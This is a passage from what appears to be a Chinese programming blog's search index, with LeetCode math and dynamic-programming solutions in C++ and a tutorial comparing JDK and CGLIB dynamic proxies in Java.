class="number">1</span>)</span></span>;</span><br><span class="line">        <span class="type">int</span> temp = nums[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; size; ++i) &#123;</span><br><span class="line">            res[i] *= temp;</span><br><span class="line">            temp *= nums[i];</span><br><span class="line">        &#125;</span><br><span class="line">        temp = nums[size - <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = size - <span class="number">2</span>; i &gt;= <span class="number">0</span>; --i) &#123;</span><br><span class="line">            res[i] *= temp;</span><br><span class="line">            temp *= nums[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：我很喜欢的一道题，仔细思考如何才能乘到前缀和后缀。</p></li><li><p>题目三：<a href="https://leetcode.cn/problems/minimum-moves-to-equal-array-elements-ii">最小操作次数使数组元素相等 II</a><br>给你一个长度为n的整数数组nums，返回使所有数组元素相等需要的最小操作数。在一次操作中，你可以使数组中的一个元素加1或者减1。</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">minMoves2</span><span class="params">(vector&lt;<span class="type">int</span>&gt; &amp;nums)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">sort</span>(nums.<span class="built_in">begin</span>(), nums.<span class="built_in">end</span>());</span><br><span class="line">        <span class="type">int</span> median = nums[nums.<span class="built_in">size</span>() / <span class="number">2</span>];</span><br><span class="line">        <span class="type">int</span> moves = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> num : nums) &#123;</span><br><span class="line">            moves += <span class="built_in">abs</span>(num - median);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> moves;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：并不是很难的一道题，就是找中位数即可，你也可以通过快速选择来完成这道题。</p></li><li><p>题目四：<a href="https://leetcode.cn/problems/majority-element">多数元素</a><br>给定一个大小为n的数组nums，返回其中的多数元素。多数元素是指在数组中出现次数大于⌊n&#x2F;2⌋的元素。</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">majorityElement</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> k = <span class="number">0</span>, cand = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> num : nums) &#123;</span><br><span class="line">            <span class="keyword">if</span> (k == <span class="number">0</span>) &#123;</span><br><span class="line">                k = <span class="number">1</span>;</span><br><span class="line">                cand = num;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (num == cand) ++k;</span><br><span class="line">                <span class="keyword">else</span> k--;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> cand;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：使用的核心思想是<strong>Boyer-Moore Majority Vote算法</strong>，可以自行上网查询该算法的思想，简单的理解就是不同的票会相互”抵消”。</p></li><li><p>题目五：<a href="https://leetcode.cn/problems/implement-rand10-using-rand7">用 Rand7() 实现 Rand10()</a><br>给定方法rand7可生成[1,7]范围内的均匀随机整数，试写一个方法rand10生成[1,10]范围内的均匀随机整数。</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// int rand7();</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">rand10</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">            <span class="type">int</span> i = (<span class="built_in">rand7</span>() - <span class="number">1</span>) * <span class="number">7</span>;</span><br><span class="line">            <span class="type">int</span> j = <span class="built_in">rand7</span>();</span><br><span class="line">            <span class="type">int</span> sum = i + j;</span><br><span class="line">            <span class="keyword">if</span> (sum &lt;= <span class="number">40</span>) <span class="keyword">return</span> sum % <span class="number">10</span> + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：不能简单地使用rand7()%4+rand7()，首先rand7()%4生成的数概率就不相同，其次这样相加出来的数概率也不相同，比如2只能为1+1，而3可以为2+1或者1+2，这里必须要乘以7的原因也在于此，这样才能生成均匀的[1, 49]，而如果值大于40的话，因为会影响概率，所以需要<strong>拒绝采样</strong>。</p></li><li><p>题目六：<a href="https://leetcode.cn/problems/happy-number">快乐数</a><br>编写一个算法来判断一个数n是不是快乐数。<br>「快乐数」 定义为：</p><ul><li>对于一个正整数，每一次将该数替换为它每个位置上的数字的平方和。</li><li>然后重复这个过程直到这个数变为1，也可能是无限循环但始终变不到 1。</li><li>如果这个过程结果为1，那么这个数就是快乐数。</li></ul><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>: </span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">getNext</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> totalSum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (n &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="type">int</span> d = n % <span class="number">10</span>;</span><br><span class="line">            n = n / <span class="number">10</span>;</span><br><span class="line">            totalSum += d * d;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> totalSum;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">IsHappy</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> slowRunner = n;</span><br><span class="line">        <span class="type">int</span> fastRunner = <span class="built_in">getNext</span>(n);</span><br><span class="line">        <span class="keyword">while</span> (fastRunner != <span class="number">1</span> &amp;&amp; slowRunner != fastRunner) &#123;</span><br><span class="line">            slowRunner = <span class="built_in">getNext</span>(slowRunner);</span><br><span class="line">            fastRunner = <span class="built_in">getNext</span>(<span class="built_in">getNext</span>(fastRunner));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> fastRunner == <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解答二(逃课解法)：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">isHappy</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> last = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> i = <span class="number">10</span>;</span><br><span class="line">        <span class="keyword">while</span> (i--) &#123;</span><br><span class="line">            last = n;</span><br><span class="line">            <span class="type">int</span> temp = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">while</span> (n &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="type">int</span> num = n % <span class="number">10</span>;</span><br><span class="line">                temp += (num * num);</span><br><span class="line">                n /= <span class="number">10</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            n = temp;</span><br><span class="line">            <span class="keyword">if</span> (last == n) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：要解决这个题首先要注意到一个重要的性质：这个过程一定存在一个环。结果为1的自不必说，以2举例：2-&gt;4-&gt;16-&gt;37-&gt;58-&gt;89-&gt;145-&gt;42-&gt;20-&gt;4。观察出这个性质之后就变成了floyd判圈问题了，找到环的入口后判断是否为1即可。</p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 算法 </tag>
            
            <tag> LeetCode </tag>
            
            <tag> 求解数学问题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java代理模式: JDK代理与CGLIB代理</title>
      <link href="/post/d45f1ea9.html"/>
      <url>/post/d45f1ea9.html</url>
      
        <content type="html"><![CDATA[<h2 id="一、JDK动态代理"><a href="#一、JDK动态代理" class="headerlink" title="一、JDK动态代理"></a>一、JDK动态代理</h2><h3 id="1-1-介绍"><a href="#1-1-介绍" class="headerlink" title="1.1 介绍"></a>1.1 介绍</h3><p>JDK动态代理机制的核心是<code>InvocationHandler</code>接口和<code>Proxy</code>类。<br>Proxy类主要是用来生成一个代理对象，使用的是<code>newProxyInstance()</code>方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">newProxyInstance</span><span class="params">(ClassLoader loader, </span></span><br><span class="line"><span class="params">                                      Class&lt;?&gt;[] interfaces, </span></span><br><span class="line"><span class="params">                                      InvocationHandler h)</span> </span><br><span class="line">        <span class="keyword">throws</span> IllegalArgumentException &#123;</span><br><span class="line">        ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个方法一共有三个参数：</p><ul><li><strong>loader</strong>：类加载器，用于加载代理对象。</li><li><strong>interface</strong>：被代理类实现的一些接口，可以指定某些具体的接口来进行代理。</li><li><strong>h</strong>：实现了<code>InvocationHandler</code>接口的对象。</li></ul><p>要实现动态代理还需要实现<code>InvocationHandler</code>来自定义处理逻辑，当动态代理对象调用了一个方法时，这个方法的调用就会被转发到实现<code>InvocationHandler</code>的<code>invoke</code>方法来调用。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">InvocationHandler</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, </span></span><br><span class="line"><span class="params">                         Method method, </span></span><br><span class="line"><span class="params">                         Object[] args)</span></span><br><span class="line">        <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">            ......</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同样<code>invoke()</code>方法有三个参数：</p><ul><li><strong>proxy</strong>：动态生成的代理类。</li><li><strong>method</strong>：与代理类对象调用的方法相对应。</li><li><strong>args</strong>：当前method方法的参数。</li></ul><p>可以通过<code>Proxy</code>类的<code>newProxyInstance()</code>创建的代理对象在调用方法的时候，实际会调用到实现<code>InvocationHandler</code>接口的类的<code>invoke()</code>方法。</p><h3 id="1-2-使用步骤"><a href="#1-2-使用步骤" class="headerlink" title="1.2 使用步骤"></a>1.2 使用步骤</h3><ul><li><p>定义一个接口及其实现类：<br>比如我们现在定义一个<code>HelloService</code>类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">HelloService</span> &#123;</span><br><span class="line">    String <span class="title function_">sayHello</span><span class="params">(String name)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再定义它的实现类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloServiceImpl</span> <span class="keyword">implements</span> <span class="title class_">HelloService</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String name)</span> &#123;</span><br><span class="line">         System.out.println(<span class="string">&quot;Hello, &quot;</span> + name)</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>自定义<code>InvocationHandler</code>并重写<code>invoke()</code>方法，在<code>invoke()</code>方法里我们会调用原生方法(被代理类的方法)并自定义一些处理逻辑：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyInvocationHandler</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span> &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 代理类中的真实对象</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Object target;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyInvocationHandler</span><span class="params">(Object target)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.target = target;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> InvocationTargetException, IllegalAccessException &#123;</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 可以通过判断method的name来对不同method做不同处理</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        System.out.println(<span class="string">&quot;before method &quot;</span> + method.getName());</span><br><span class="line">        <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> method.invoke(target, args);</span><br><span class="line">        System.out.println(<span class="string">&quot;after method &quot;</span> + method.getName());</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>通过<code>Proxy.newProxyInstance()</code>方法创建代理对象：<br>一般用工厂类来封装：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  可以自定义需要代理的接口，例子的写法默认全部代理</span></span><br><span class="line"><span class="comment"> *  比如：</span></span><br><span class="line"><span class="comment"> *  Class&lt;?&gt;[] interfaces = &#123; HelloService.class &#125;;</span></span><br><span class="line"><span class="comment"> *      return Proxy.newProxyInstance(</span></span><br><span class="line"><span class="comment"> *      target.getClass().getClassLoader(),</span></span><br><span class="line"><span class="comment"> *      interfaces,                       // 只指定你写在interfaces里的接口</span></span><br><span class="line"><span class="comment"> *      new DebugInvocationHandler(target)</span></span><br><span class="line"><span class="comment"> *  );</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JdkProxyFactory</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getProxy</span><span class="params">(Object target)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Proxy.newProxyInstance(</span><br><span class="line">                target.getClass().getClassLoader(), </span><br><span class="line">                target.getClass().getInterfaces(),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">MyInvocationHandler</span>(target) </span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>实际使用：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">HelloService</span> <span class="variable">helloService</span> <span class="operator">=</span> (HelloService) JdkProxyFactory.getProxy(<span class="keyword">new</span> <span class="title class_">HelloServiceImpl</span>());</span><br><span class="line">helloService.send(<span class="string">&quot;java&quot;</span>);</span><br></pre></td></tr></table></figure><p>控制台会输出：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">before method sayHello</span><br><span class="line">Hello, java</span><br><span class="line">after method sayHello</span><br></pre></td></tr></table></figure></li></ul><h2 id="二、CGLIB动态代理"><a href="#二、CGLIB动态代理" class="headerlink" title="二、CGLIB动态代理"></a>二、CGLIB动态代理</h2><h3 id="2-1-介绍"><a href="#2-1-介绍" class="headerlink" title="2.1 介绍"></a>2.1 介绍</h3><p><strong>JDK</strong>动态代理有一个致命问题是只能代理实现了接口的类，为了解决这个问题，我们可以使用<strong>CGLIB</strong>动态代理来避免。</p><p>CGLIB是一个基于ASM字节码的生成库，允许我们在运行时对字节码进行修改和动态生成。CGLIB通过继承方式实现代理。在SpringBoot的AOP模块中，如果目标对象实现了接口，默认使用JDK代理，否则使用CGLIB动态代理。</p><p>在CGLIB动态代理机制中，<code>MethodInterceptor</code>接口和<code>Enhancer</code>类是核心。</p><p>需要自定义<code>MethodInterceptor</code>并且重写<code>intercept()</code>方法用于拦截增强被代理类的方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">MethodInterceptor</span> <span class="keyword">extends</span> <span class="title class_">Callback</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">intercept</span><span class="params">(Object obj, </span></span><br><span class="line"><span class="params">                            java.lang.reflect.Method method, </span></span><br><span class="line"><span class="params">                            Object[] args,</span></span><br><span class="line"><span class="params">                            MethodProxy proxy)</span> </span><br><span class="line">        <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">            ......</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个方法有四个参数：</p><ul><li><strong>obj</strong>：被代理的对象(需要增强的对象)。</li><li><strong>method</strong>：被拦截的方法(需要增强的方法)。</li><li><strong>args</strong>：方法的参数。</li><li><strong>proxy</strong>：用于调用原始方法。</li></ul><p>可以通过<code>Enhancer</code>类来动态获取被代理类，当代理类调用方法的时候，实际调用的是<code>MethodInterceptor</code>中的<code>intercept()</code>方法。</p><h3 id="2-2-使用步骤"><a href="#2-2-使用步骤" class="headerlink" title="2.2 使用步骤"></a>2.2 使用步骤</h3><ul><li><p>定义一个类：<br>这里定义类<code>HelloService</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloService</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello, &quot;</span> + name)</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>自定义<code>MethodInterceptor</code>并且重写<code>intercept()</code>方法，和JDK动态代理中的<code>invoke</code>方法类似：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyMethodInterceptor</span> <span class="keyword">implements</span> <span class="title class_">MethodInterceptor</span> &#123;</span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> o           代理对象本身（注意不是原始对象，如果使用method.invoke(o, args)会导致循环调用）</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> method      被拦截的方法（需要增强的方法）</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> args        方法入参</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> methodProxy 高性能的方法调用机制，避免反射开销</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">intercept</span><span class="params">(Object o, Method method, Object[] args, MethodProxy methodProxy)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;before method &quot;</span> + method.getName());</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> methodProxy.invokeSuper(o, args);</span><br><span class="line">        System.out.println(<span class="string">&quot;after method &quot;</span> + method.getName());</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意这里的<code>o</code>已经是继承了原始类的子类，所以会产生递归调用，需要使用包含了原始类method指针的<code>methodProxy</code>来进行父类方法调用。</p></li><li><p>通过<code>Enhancer</code>类的<code>create()</code>创建代理类：<br>也是通过工厂类来包装：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CglibProxyFactory</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getProxy</span><span class="params">(Class&lt;?&gt; clazz)</span> &#123;</span><br><span class="line">        <span class="type">Enhancer</span> <span class="variable">enhancer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Enhancer</span>();</span><br><span class="line">        enhancer.setClassLoader(clazz.getClassLoader());</span><br><span class="line">        enhancer.setSuperclass(clazz); <span class="comment">// 设置被代理类</span></span><br><span class="line">        enhancer.setCallback(<span class="keyword">new</span> <span class="title class_">MyMethodInterceptor</span>());</span><br><span class="line">        <span class="keyword">return</span> enhancer.create();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意被代理类是父类，因为代理类会继承它。</p></li><li><p>实际使用：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">HelloService</span> <span class="variable">helloService</span> <span class="operator">=</span> (HelloService) CglibProxyFactory.getProxy(HelloService.class);</span><br><span class="line">helloService.sayHello(<span class="string">&quot;java&quot;</span>);</span><br></pre></td></tr></table></figure><p>控制台会输出：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">before method sayHello</span><br><span class="line">Hello, java</span><br><span class="line">after method sayHello</span><br></pre></td></tr></table></figure></li></ul><h2 id="三、两种模式的对比"><a href="#三、两种模式的对比" class="headerlink" title="三、两种模式的对比"></a>三、两种模式的对比</h2><ul><li>JDK动态代理只能代理实现了接口的类或者直接代理接口，而CGLIB可以代理未实现任何接口的类。 另外， CGLIB动态代理是通过生成一个被代理类的子类来拦截被代理类的方法调用，因此不能代理声明为final类型的类和方法，private方法也无法代理。</li><li>就二者的效率来说，大部分情况都是JDK动态代理更优秀，随着JDK版本的升级，这个优势更加明显。</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> 代理模式 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LeetCode刷题笔记(六): 动态规划</title>
      <link href="/post/1421f419.html"/>
      <url>/post/1421f419.html</url>
      
        <content type="html"><![CDATA[<p>算法介绍：动态规划(Dynamic Programming, DP)在查找有很多重叠子问题的情况的最优解时有效。它将问题重新组合成子问题。为了避免多次解决这些子问题，它们的结果都逐渐被计算并被保存，从简单的问题直到整个问题都被解决。因此，动态规划保存递归时的结果，因而不会在解决同样的问题时花费时间。<br>补充：</p><ul><li>动态规划只能应用于有最优子结构的问题。最优子结构的意思是局部最优解能决定全局最优解(对有些问题这个要求并不能完全满足，故有时需要引入一定的近似)。简单地说，问题能够分解成子问题来解决。</li><li>动态规划和其它遍历算法(如深&#x2F;广度优先搜索)都是将原问题拆成多个子问题然后求解，他们之间最本质的区别是，动态规划保存子问题的解，避免重复计算。解决动态规划问题的关键是找到状态转移方程，这样我们可以通过计算和储存子问题的解来求解最终问题。</li><li>可以对动态规划进行空间压缩，起到节省空间消耗的效果。</li><li>如果题目需求的是最终状态，那么使用动态搜索比较方便；如果题目需要输出所有的路径，那么使用带有状态记录的优先搜索会比较方便。</li></ul><h2 id="一、一维动态规划"><a href="#一、一维动态规划" class="headerlink" title="一、一维动态规划"></a>一、一维动态规划</h2><ul><li><p>题目一：<a href="https://leetcode.cn/problems/climbing-stairs">爬楼梯</a><br>给定n节台阶，每次可以走一步或走两步，求一共有多少种方式可以走完这些台阶。</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">climbStairs</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">dp</span><span class="params">(n + <span class="number">1</span>, <span class="number">1</span>)</span></span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i &lt;= n; ++i) &#123;</span><br><span class="line">            dp[i] = dp[i - <span class="number">1</span>] + 